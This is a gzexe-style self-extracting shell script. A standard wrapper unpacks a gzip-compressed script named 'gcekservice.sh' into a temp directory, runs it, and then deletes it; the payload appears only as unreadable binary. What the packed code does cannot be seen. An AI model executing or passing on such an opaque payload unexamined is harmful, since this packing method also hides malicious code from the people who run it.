#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
��Sgcekservice.sh �]o�V�ݿ��Er�B� � (qR�`�!�D�blf�&���eմ���$��u�6i����?�/�Oع����x�4u3����랫���Ǫ�+�	3�+�XшeZ�)k���9t2 npn����r�)p#s�S��Dv�U`7�d��Y�4�G6�d���P��:�&1��-3jda+��g2��\f���|,Ҍ��B�Tٟ�2!ڣҮ0�dC��\-�h�h�F!d�a�Rw�g�B$���)�S�P4�P��M5��X�����,W�<�L�0�Bb$�#60 J����v����p9�8�T�-Qڙ���"�5��1RD�K���'�1z�/&�K,0�gCbZ�V,�1���"����f� =�����<�r��`��� �Ċ�e��e(}ܐ�1�T��z��ϧa��D�� ��fֶ�WT�[��o�{��N2ꀒ�FR&�k���:@іj�/�R�Us��ntѣ���,�RH�6֩�o17X*��ybX��J�N�+ȌځfB=�Y�N��uU�,��9��l64������6�V�3���4IR8�~�.��|8����Q��1���#J����� p��N=,��-��}��zo<�B�~D�ݭ6���bUs�����D泼%0�ܴH�e��tόa�4�
-K}J�Ɛvb�ޢ�+<::�� �AuGם�n���Ǳ �6���։N���&��Tfzy1�|q��\�^.f<e^�d>b����������Ǉ���>�]���f3��p�@�8qx�K�,���	s��u	\^_Կ�q_,�S\?��r6�/�}>��d�*$�Ol �]|`u9��'��Xv�MԽ�_��ד�p]����7��S���"x %��_����WT�2�z����ENp}�I��n<U��ׯ����*��O��deO�_O�_���Ko��������fs��G}]�/s��G	Π�� �E(�$�s*X�/���]����\�w�x�ܡ���?p���֨Յ�W�M��3��\(����ӆ�1�XG�n�.���::��rG�U��3h,�XoD�� �x�����x�Wju:���x,�AUĉd�zI�:'Ǒ?�(Vd!$�G��`c�õ����~��K�|��ӫPs?��߲@�g��Y�;n�:��I��7��m��~�Tr�8�R�S}��;��?���8����}���_��!%�  